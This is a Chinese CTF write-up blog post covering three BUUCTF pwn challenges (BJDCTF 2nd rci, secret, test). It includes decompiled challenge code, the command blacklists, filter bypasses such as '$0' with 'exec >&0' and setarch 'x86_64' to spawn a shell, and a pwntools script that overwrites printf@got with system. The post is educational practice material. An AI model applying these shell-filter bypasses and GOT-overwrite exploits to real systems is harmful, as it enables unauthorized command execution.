<!--yml
category: 未分类
date: 2022-04-26 14:36:33
-->

# buuctf解题记录_song-10的博客-CSDN博客_buuctf解题

> 来源：[https://blog.csdn.net/song_10/article/details/106251200](https://blog.csdn.net/song_10/article/details/106251200)

[更多内容关注博客新址](https://song-10.gitee.io)

**If you don’t go into the water, you can’t swim in your life**

文中所用到的程序文件：[bin file](https://github.com/song-10/write-up)

## [BJDCTF 2nd]rci

### 相似题目：Hgame 2020 findyourself

init()函数：

```
unsigned __int64 init()
{
  fd = open("/dev/urandom", 0);
  buf = 0;
  read(fd, &buf, 1uLL);
  buf %= 50;
  if ( fd < 0 )
    exit(-1);
  chdir("./tmp");
  for ( i = 0; i <= 49; ++i )
  {
    read(fd, &v4[i], 4uLL);
    snprintf(&v5[20 * i], 0x14uLL, "0x%x", (unsigned int)v4[i]);
    mkdir(&v5[20 * i], 0x1EDu);
  }
  snprintf(&s, 0x16uLL, "./%s", &v5[20 * buf]);
  chdir(&s);
  puts("find yourself");
  read_n(&command, 25LL);
  if ( (unsigned int)check1(&command) != -1 )
    system(&command);
  return __readfsqword(0x28u) ^ v8;
} 
```

在/temp目录下随机创建50个文件夹(文件夹名随机)，然后随机切换到其中的一个文件夹中，执行一次system(cmd).

cmd在check1中被过滤：

```
signed __int64 __fastcall check1(const char *a1)
{
  for ( i = 0; i < strlen(a1); ++i )
  {
    if ( (a1[i] <= 96 || a1[i] > 122) && (a1[i] <= 64 || a1[i] > 90) && a1[i] != 47 && a1[i] != 32 && a1[i] != 45 )
      return 0xFFFFFFFFLL;
  }
  if ( strstr(a1, "sh") || strstr(a1, "cat") || strstr(a1, "flag") || strstr(a1, "pwd") || strstr(a1, "export") )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
} 
```

check1过滤掉的字符串：`"sh", "cat", "flag", "pwd", "export"`
允许的字符范围：`A-Za-z`, `/,-`以及空格
docker中能利用的命令不多，除了被过滤的cat 和sh之外，还有 ls 和cd。
其中，
`cd -`可以输出OLD_PWD
`ls`可以输出当前路径下的文件名，由于题目中要求对比绝对路径，所以加上参数 `-ali`(详见后文)
接着在main()函数中：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  memset(&buf, 0, 0x40uLL);
  getcwd(&buf, 0x40uLL);
  puts("where are you?");
  read_n(&s1, 64LL);
  if ( strcmp(&s1, &buf) )
  {
    puts("nonono,not there");
    exit(0);
  }
  read_n(&s1, 20LL);
  if ( (unsigned int)check2(&s1, 20LL) == -1 )
  {
    puts("oh,it's not good idea");
    exit(0);
  }
  close(1);
  close(2); // 两个close关闭stdout、stderr
  system(&s1);
  return 0;
} 
```

main函数中首先会要求输入当前的目录，验证之和再执行一次system(cmd),其中cmd被check2过滤

check2()：

```
signed __int64 __fastcall check2(const char *a1)
{
  if ( strchr(a1, '*')
    || strstr(a1, "sh")
    || strstr(a1, "cat")
    || strstr(a1, "..")
    || strchr(a1, '&')
    || strchr(a1, '|')
    || strchr(a1, '>')
    || strchr(a1, '<') )
  {
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
  }
  return result;
} 
```

check2过滤掉:`"sh", "*", "cat", "..", "&", "|", ">", "<"`，并且由于关闭了stdout和stderro，所以得不到输出
也可以通过 `ls -al /proc/self/` 或者 `ls -al /proc/self/cwd`获取当前路径，通过`$0`绕过check2，然后重定向到输入：

```
$0
exec >&0
cat /flag 
```

### rci

分析与findyourself一致，只是此题不能通过 `ls -al /proc/self/`来获取绝对路径,所以只能通过 `-ali`来获得路径：

> ls -l # 以列表格式显示
> ls -a # 不隐藏以.开头的文件
> ls -i # 显示文件inode,其中inode唯一

打开一个终端，然后键入`ls -ali`可以得到当前文件夹下的inode,选择18631212（.代表当前文件夹），再开一个终端利用grep过滤，`ls -ali /tmp`得到当前路径，之后返回当前终端，`$0`绕过check2，得到flag

```
nop@nop-pwn:~/Desktop$ nc node3.buuoj.cn 29623
正在送imagin去小黑窝~
Level Up ! 获得道具 ls
ls -ali
total 24
18631212 drwxr-xr-x 2 1000 1000  4096 Apr  2 04:32 .
17328166 drwxrwx--- 1    0 1000 20480 Apr  2 04:32 ..
[你得到了一些关于imagin的线索]
不过......Ta在哪里呢?
/tmp/R0OM#0731741966
恭喜你找到了imagin的小黑窝！氮素Ta已经被藕送走啦！哈哈哈哈

Level Up ! 获得道具 残缺的shell
$0
你成功地修复了shell，快去找imagin叭~
exec >&0
pwd
/tmp/R0OM#0731741966
cd ../..
cd imagin
ls
bin
dev
imagin
lib
lib32
lib64
libx32
rci
tmp
cat imagin
flag{5fcd2cea-5330-4d33-b21a-291eec874be3} 
```

```
# 另开的终端，获取文件夹名
nop@nop-pwn:~$ nc node3.buuoj.cn 29623 | grep 18631212
ls -ali /tmp
18631212 drwxr-xr-x 2 1000 1000  4096 Apr  2 04:32 R0OM#0731741966 
```

因为此题会输出文件名，所以可以通过python也可以读取打开的文件名,奈何水平有限不能直接通过脚本拿到shell

```
p = remote('node3.buuoj.cn',29623)
p.recvuntil('~')
addr_current_dir = p.recvuntil('Level Up !',drop=True)
addr_current_dir = addr_current_dir.split('\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08')[-2]
log.info(addr_current_dir)

sleep(1)
p.sendline('ls')    
p.recvuntil('?')
p.send('/tmp/'+addr_current_dir) 
```

## [BJDCTF 2nd]secret

题目功能是猜数，数据都在程序中，但是有10000个，可以通过脚本提取出来，但是速度还是太慢。
分析可以注意到
`buf[(signed int)((unsigned __int64)read(0, buf, 0x16uLL) - 1)] = 0;`
总共可以读取0x16个字符，但是buf的长度为10，也就是说我们可以覆写buf之后的off_46D090，off_46D090在开始时被置为10000，用于记录猜数的次数，即每次猜数成功值减一。

所以可以将其覆写为printf@got,因为注意到system@got与printf@got只相差0x10，所以我们成功猜测16次之后即可将printf@got修改为system@got

```
 import re
    from pwn import *

    file=open("secret.asm",'r')
    data=file.readlines()
    data_list = []
    for i in range(len(data)):
        if re.search('cmp    eax,',data[i]):
            data_list.append(int(data[i][-7:],16))
    log.success("data got!%d"%len(data_list))

    p = process('./secret')

    def way1():
        p.send('AAA')   

        for i in data_list:
            p.send(str(i))
            sleep(0.1)
        p.interactive()

    def way2():

        payload = '/bin/sh\x00'.ljust(0x10,'a')
        payload += p32(ELF('./secret',checksec=False).got['printf'])

        p.send(payload)
        for i in range(0xf):
            p.send(str(data_list[i]))
            sleep(0.1)
        p.interactive()

    way2() 
```

## [BJDCTF 2nd]test

```
// test.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){
    char cmd[0x100] = {0};
    puts("Welcome to Pwn-Game by TaQini.");
    puts("Your ID:");
    system("id");
    printf("$ ");
    gets(cmd);
    if( strstr(cmd, "n")
       ||strstr(cmd, "e")
       ||strstr(cmd, "p")
       ||strstr(cmd, "b")
       ||strstr(cmd, "u")
       ||strstr(cmd, "s")
       ||strstr(cmd, "h")
       ||strstr(cmd, "i")
       ||strstr(cmd, "f")
       ||strstr(cmd, "l")
       ||strstr(cmd, "a")
       ||strstr(cmd, "g")
       ||strstr(cmd, "|")
       ||strstr(cmd, "/")
       ||strstr(cmd, "$")
       ||strstr(cmd, "`")
       ||strstr(cmd, "-")
       ||strstr(cmd, "<")
       ||strstr(cmd, ">")
       ||strstr(cmd, ".")){
        exit(0);
    }else{
        system(cmd);
    }
    return 0;
} 
```

进入终端可以看到程序的原码，但是不能读到flag，查看源码可提取出过滤掉的字符：`n|e|p|b|u|s|h|i|f|l|a|g|||/|$|`|-|<|>|.`

接用别人的脚本

```
a = '''    if( strstr(cmd, "n")
       ||strstr(cmd, "e")
       ||strstr(cmd, "p")
       ||strstr(cmd, "b")
       ||strstr(cmd, "u")
       ||strstr(cmd, "s")
       ||strstr(cmd, "h")
       ||strstr(cmd, "i")
       ||strstr(cmd, "f")
       ||strstr(cmd, "l")
       ||strstr(cmd, "a")
       ||strstr(cmd, "g")
       ||strstr(cmd, "|")
       ||strstr(cmd, "/")
       ||strstr(cmd, "$")
       ||strstr(cmd, "`")
       ||strstr(cmd, "-")
       ||strstr(cmd, "<")
       ||strstr(cmd, ">")
       ||strstr(cmd, ".")){'''
import re
print("|".join(re.findall("\"(.*?)\"",a))) 
```

剔除无用符号然后查看环境变量，利用grep搜索可使用的命令：

```
ctf@9bfc4ddb5e89:~$ ls /usr/bin/ /bin/ | grep -v -E "n|e|p|b|u|s|h|i|f|l|a|g"
dd
kmod
mt
mv
rm

2to3
2to3-2.7
2to3-3.4
[
comm
od
tr
tty
w
wc
x86_64
xxd
ctf@9bfc4ddb5e89:~$ 
```

发现od和x86_64可用：

od 命令可以得到flag文件对应的八进制

```
ctf@9bfc4ddb5e89:~$ ./test
Welcome to Pwn-Game by TaQini.
Your ID:
uid=1000(ctf) gid=1000(ctf) egid=1001(ctf_pwn) groups=1000(ctf)
$ od *
0000000 066146 063541 031173 062465 033541 061543 026471 063144
0000020 034060 032055 032071 026465 034470 062063 062455 063142
0000040 034146 030464 062544 032144 076461 077412 046105 001106
0000060 000401 000000 000000 000000 000000 001000 037000 000400
0000100 000000 000000 040006 000000 000000 040000 000000 000000
0000120 000000 014000 000033 000000 000000 000000 000000 040000 
```

转成字符串：

```
 import binascii
tmp = "066146 063541 031173 062465 033541 061543 026471 063144 \
0000020 034060 032055 032071 026465 034470 062063 062455 063142 \
0000040 034146 030464 062544 032144 076461 077412 046105 001106 \
0000060 000401"
for i in tmp.split(" "):
  try:
    print(binascii.unhexlify(bytes(hex(int(i,8))[2:],encoding="UTF-8")).decode("utf-8")[::-1],end="")
  except Exception:
    continue 
```

对于x86_64,

> setarch - change reported architecture in new program environment and/or set personality flags
> …
> The default program is /bin/sh.

大致就是默认情况下可以开启一个终端（/bin/sh)

```
ctf@9bfc4ddb5e89:~$ ./test
Welcome to Pwn-Game by TaQini.
Your ID:
uid=1000(ctf) gid=1000(ctf) egid=1001(ctf_pwn) groups=1000(ctf)
$ x86_64
$ whoami
ctf
$ cat flag
flag{25ea7cc9-df08-4945-893d-ebff841ded41}
$ 
```